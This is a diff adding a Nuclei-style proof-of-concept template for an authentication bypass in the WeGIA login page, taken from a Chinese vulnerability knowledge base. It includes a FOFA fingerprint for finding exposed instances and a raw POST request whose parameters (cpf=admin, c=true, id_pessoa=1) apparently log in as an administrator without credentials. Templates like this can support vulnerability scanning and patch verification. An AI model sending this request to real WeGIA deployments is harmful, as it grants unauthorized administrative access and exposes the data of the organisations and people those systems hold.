@@ -1,0 +1,28 @@
+id: poc-qc3tt7x0smu0ovog
+info:
+  name: WeGIA存在前台login存在认证绕过漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qc3tt7x0smu0ovog'
+  tags: unauth,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qc3tt7x0smu0ovog
+    fofa: '"./assets/vendor/select2/select2.js"'
+http:
+- raw:
+  - 'POST /WeGIA/html/login.php HTTP/1.1
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+
+    like Gecko) Chrome/91.0.4472.77 Safari/537.36
+
+
+    cpf=admin&c=true&id_pessoa=1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
